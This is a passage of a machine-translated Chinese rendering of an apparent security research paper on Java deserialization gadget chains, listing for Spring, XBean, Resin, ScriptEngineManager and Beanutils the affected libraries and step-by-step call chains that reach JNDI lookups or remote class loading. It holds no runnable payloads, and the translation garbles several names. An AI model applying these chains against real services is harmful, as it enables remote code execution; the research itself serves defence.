<div style="position:absolute;top:27939;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="23"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 23 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:28102;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. AspectJPointcutAdvisor-&gt;getOrder() 然后调用 AbstractAspectJAdvice</font></font></nobr></div>
<div style="position:absolute;top:28121;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;getOrder()。</font></font></nobr></div>
<div style="position:absolute;top:28141;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 调用 AspectInstanceFactory-&gt;getOrder()。</font></font></nobr></div>
<div style="position:absolute;top:28163;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. BeanFactoryAspectInstanceFactory-&gt;getOrder() 最后调用BeanFactory</font></font></nobr></div>
<div style="position:absolute;top:28182;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;getType()。</font></font></nobr></div>
<div style="position:absolute;top:28202;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. SimpleJndiBeanFactory-&gt;getType() 触发 JNDI 查找。</font></font></nobr></div>
<div style="position:absolute;top:28226;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取 toString() 调用并不像 Java 反序列化那样简单 -</font></font></nobr></div>
<div style="position:absolute;top:28244;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重刑，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">54</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但仍有可能。</font><font style="vertical-align: inherit;">com.sun.org.apache.xpath.internal.objects.XObject</font></font></nobr></div>
<div style="position:absolute;top:28262;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将对它的 equals() 方法的参数调用 toString()。</font><font style="vertical-align: inherit;">标准库</font></font></nobr></div>
<div style="position:absolute;top:28280;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，如果对象的哈希码匹配，则集合只会检查相等性。</font><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:28298;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而 XObject 的哈希码可以通过正确选择其设置为任意值</font></font></nobr></div>
<div style="position:absolute;top:28315;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串值，PartiallyComparableAdvisorHolder 没有 hashCode() 实现</font></font></nobr></div>
<div style="position:absolute;top:28333;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">心理，并产生不可预测的。</font><font style="vertical-align: inherit;">HotSwappableTargetSource 来了</font></font></nobr></div>
<div style="position:absolute;top:28351;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">救援：它有一个固定的哈希码并提供另一个 HotSwappableTargetSource</font></font></nobr></div>
<div style="position:absolute;top:28369;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到它的 equals() 方法将检查它们的 Object-valued 'target' 字段是否相等。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:28412;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.12 Spring AOP AbstractBeanFactoryPointcutAdvisor</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:28449;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:28483;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛇YAML</font></font></a></nobr></div>
<div style="position:absolute;top:28483;left:277"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(3.1.1)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
<div style="position:absolute;top:28483;left:347"><nobr><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰克逊</font></font></a></nobr></div>
<div style="position:absolute;top:28483;left:418"><nobr><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(3.1.6)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#9"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
<div style="position:absolute;top:28483;left:488"><nobr><a href="https://translate.googleusercontent.com/translate_f#10"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚轮 (3.1.7)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#10"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
<div style="position:absolute;top:28483;left:622"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥</font></font></a></nobr></div>
<div style="position:absolute;top:28483;left:674"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(3.2.2)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
<div style="position:absolute;top:28501;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hessian/Burlap (3.2.3) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> json-io (3.2.4) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:28541;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在类路径上需要 spring-aop。</font><font style="vertical-align: inherit;">需要默认构造函数调用或能力</font></font></nobr></div>
<div style="position:absolute;top:28559;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恢复瞬态字段以及恢复非 java.io.Serializable 的能力。</font></font></nobr></div>
<div style="position:absolute;top:28582;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. AbstractPointcutAdvisor-&gt;equals() 调用 AbstractBeanFactoryPointcut</font></font></nobr></div>
<div style="position:absolute;top:28602;left:204"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">顾问-&gt;getAdvice()。</font></font></nobr></div>
<div style="position:absolute;top:28622;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. AbstractBeanFactoryPointcutAdvisor-&gt;getAdvice() 然后调用BeanFactory</font></font></nobr></div>
<div style="position:absolute;top:28641;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;getBean()。</font></font></nobr></div>
<div style="position:absolute;top:28661;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. SimpleJndiBeanFactory-&gt;getBean() 触发 JNDI 查找。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:28704;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.13 Spring DefaultListableBeanFactory</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:28737;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鉴于该机制能够恢复它， SimpleJndiBeanFactory (</font></font><a href="https://translate.googleusercontent.com/translate_f#22"></a><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.10</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#22"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:28755;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.11 </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 4.12</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#23"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) 也可以替换为 DefaultListableBeanFactory。</font><font style="vertical-align: inherit;">这需要</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:28773;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够恢复非 java.io.Serializable </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">55 个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象，恢复瞬态字段或</font></font></nobr></div>
<div style="position:absolute;top:28791;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用构造函数，不调用readObject()，不能通过setter实现</font></font></nobr></div>
<div style="position:absolute;top:28809;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法。</font><font style="vertical-align: inherit;">Alvaro Muñoz 之前曾描述过它在 Java 序列化中的使用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">56</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:28834;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">54 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">javax.management.BadAttributeValueExpException，至少在没有 SecurityManager 活动的情况下，在-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28850;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 readObject() 调用 toString()。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:28862;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">55</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些 ThreadLocals 和 org.springframework.beans.factory.support.InstantiationStrategy</font></font></font></nobr></div>
<div style="position:absolute;top:28876;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">56 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2011-2894 – </font></font></font><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://www </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">温特斯特</font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/blog/2013/12/16/cve-2011-2894-deserialization-</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:28894;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">弹簧-rce/</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:28953;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:29201;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="24"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 24 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:29364;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，他的方法需要使用代理。</font><font style="vertical-align: inherit;">Spring对象构造可以</font></font></nobr></div>
<div style="position:absolute;top:29381;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用上述</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringBFAdv (4.12)</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringPropFac (4.10)</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链</font><font style="vertical-align: inherit;">触发</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:29426;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.14 Apache XBean</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:29464;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:29498;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Java 序列化 (3.2.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Kryo (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></font><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">粗麻布/粗麻布 (3.2.3)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#13"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
<div style="position:absolute;top:29516;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">json-io (3.2.4) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:29557;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要 xbean 命名。</font><font style="vertical-align: inherit;">不需要或任意构造函数调用。</font><font style="vertical-align: inherit;">所有涉及的班级</font></font></nobr></div>
<div style="position:absolute;top:29575;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 java.io.Serializable。</font></font></nobr></div>
<div style="position:absolute;top:29601;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.使用一个toString（）触发器等中所描述的一个</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringCompAdv（4.11）</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上</font></font></nobr></div>
<div style="position:absolute;top:29620;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding。</font><font style="vertical-align: inherit;">在-</font></font></nobr></div>
<div style="position:absolute;top:29637;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stance 没有稳定的 hashCode()，所以一些额外的技巧是重新</font></font></nobr></div>
<div style="position:absolute;top:29655;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">57</font></font></font></nobr></div>
<div style="position:absolute;top:29677;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. javax.naming.Binding-&gt;toString() 调用 getObject()。</font></font></nobr></div>
<div style="position:absolute;top:29699;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. ReadOnlyBinding-&gt;getObject() 调用 ContextUtil-&gt;resolve() 与一个 sup-</font></font></nobr></div>
<div style="position:absolute;top:29717;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">折叠 javax.naming.Reference。</font></font></nobr></div>
<div style="position:absolute;top:29740;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4、ContextUtil-&gt;resolve()直接调用javax.naming.spi.NamingManager</font></font></nobr></div>
<div style="position:absolute;top:29759;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt;getObjectInstance()。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">58</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:29802;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.15 高乔树脂</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:29836;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:29871;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥 (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></font><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hessian/Burlap (3.2.3) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> json-io (3.2.4) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:29912;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要 Resin 基础库包。</font><font style="vertical-align: inherit;">不需要或任意构造函数调用。</font></font></nobr></div>
<div style="position:absolute;top:29931;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">javax.naming.spi.ContinuationContext 不是 java.io.Serializable。</font></font></nobr></div>
<div style="position:absolute;top:29955;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com.caucho 上的 SpringCompAdv (4.11) 中</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述的 toString() 触发器</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:29975;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命名.QName。</font><font style="vertical-align: inherit;">它有一个稳定的 hashCode() 实现。</font></font></nobr></div>
<div style="position:absolute;top:29996;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. QName-&gt;toString() 调用 javax.naming.Context-&gt;composeName()</font></font></nobr></div>
<div style="position:absolute;top:30018;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. ContinuationContext-&gt;composeName() 调用 getTargetContext() 触发</font></font></nobr></div>
<div style="position:absolute;top:30036;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gers NamingManager-&gt;getContext() 与攻击者提供的对象，最终</font></font></nobr></div>
<div style="position:absolute;top:30054;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致 NamingManager-&gt;getObjectInstance() 调用。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:30096;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">57 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com.sun.org.apache.xpath.internal.objects.XObject 结合任何通过的类</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:30112;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 Object-&gt;toString() 调用但独立提供稳定的 hashCode()</font></font></nobr></div>
<div style="position:absolute;top:30126;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该对象的 hashCode() 会这样做，这些并不是特别罕见，org.apache.johnzon.core。</font></font></nobr></div>
<div style="position:absolute;top:30141;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JsonObjectImpl 是另一个例子</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:30152;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">58</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过最近为 JNDI 引用添加的代码库限制</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:30215;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:30463;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="25"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 25 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:30623;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.16 javax.script.ScriptEngineManager</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:30662;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:30695;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#6"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SnakeYAML (3.1.1)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:30736;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font><font style="vertical-align: inherit;">需要能够调用任意配置</font></font></nobr></div>
<div style="position:absolute;top:30754;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有提供数据的构造函数。</font><font style="vertical-align: inherit;">涉及的类型不实现 java.io.Serializable。</font></font></nobr></div>
<div style="position:absolute;top:30779;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 构造一个指向远程类路径的 java.net.URL 对象。</font></font></nobr></div>
<div style="position:absolute;top:30802;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用该 URL 构造一个 java.net.URLClassLoader。</font></font></nobr></div>
<div style="position:absolute;top:30824;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用该类加载器构造一个 javax.script.ScriptEngineManager。</font></font></nobr></div>
<div style="position:absolute;top:30847;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 构造函数调用为javax.script 调用ServiceLoader 机制。</font></font></nobr></div>
<div style="position:absolute;top:30866;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程类路径上的 ScriptEngineFactory，最终实例化一个</font></font></nobr></div>
<div style="position:absolute;top:30883;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现该接口的任意远程类。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:30927;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.17 Commons Beanutils BeanComparator</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:30965;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:30998;left:173"><nobr><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 序列化 (3.2.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Kryo (3.2.2) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:31040;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已知的 Java 反序列化小工具，首先由 Chris Frohoff 发布。</font><font style="vertical-align: inherit;">工具</font></font></nobr></div>
